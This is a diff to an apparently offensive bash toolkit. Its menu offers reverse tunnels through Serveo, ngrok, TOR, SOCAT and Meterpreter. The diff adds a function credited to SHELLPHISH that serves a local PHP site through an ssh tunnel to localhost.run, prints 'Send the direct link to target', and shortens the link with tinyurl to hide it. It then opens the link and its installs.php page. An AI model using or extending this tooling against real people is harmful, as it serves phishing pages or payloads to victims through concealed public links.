@@ -15,10 +15,11 @@ default_port="12345"
 
 startmenu() {
 	banner
-	printf "\e[92m  SSH Reverse Tunneling                                      =  1\n"
+	printf "\e[92m  Serveo SSH Reverse Tunneling                               =  1\n"
 	printf "  NGROK Reverse Tunneling                                    =  2\n"
+#	printf "  Localhost.run SSH PHP Reverse Tunneling                    =  3\n"
 	if command -v tor > /dev/null 2>&1; then
-		printf "  TOR Reverse Tunneling & Hidden Service                     =  3\n"
+		printf "  TOR Reverse Tunneling & Hidden Service                     =  9\n"
 	fi
 	printf "  SOCAT Reverse Tunneling Proxy                              = 10\n"
 	printf "  Run Meterpreter reverse tunnels                            = 20\n"
@@ -31,7 +32,8 @@ startmenu() {
 		99) stop 1 ;;
 		1|01) menussh ;;
 		2|02) ngrokme; menungrok ;; 
-		3|03) menutor ;;
+		3|03) servelocalhost ;;
+		9|09) menutor ;;
 		10) menusocat ;;
 		20) menumetasploit ;;
 		30)
@@ -794,6 +796,32 @@ serveserveo() {
 	printf "\n"
 	firefox $send_link $send_link/installs.php
 	menussh
+}
+
+servelocalhost() {
+	lip
+	# SHELLPHISH, AUTHOR: @thelinuxchoice
+	printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+	cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
+	sleep 2
+	printf "\e[92mStarting server...\e[0m\n"
+	command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
+	if [[ -e sendlink ]]; then
+		rm -rf sendlink
+	fi
+	printf "ssh -R 80:localhost:$lport ssh.localhost.run 2> /dev/null > sendlink "
+	$(which sh) -c 'ssh -R 80:localhost:'$lport' ssh.localhost.run 2> /dev/null > sendlink ' &
+	printf "\n"
+	sleep 10
+	send_link=$(grep -o "https://[0-9a-z]*\.localhost.run" sendlink)
+	printf "\n"
+	printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
+	send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+	printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+	printf "\n"
+	firefox $send_link $send_link/installs.php
+	read me
+	startmenu
 }
 
 servengrok() {
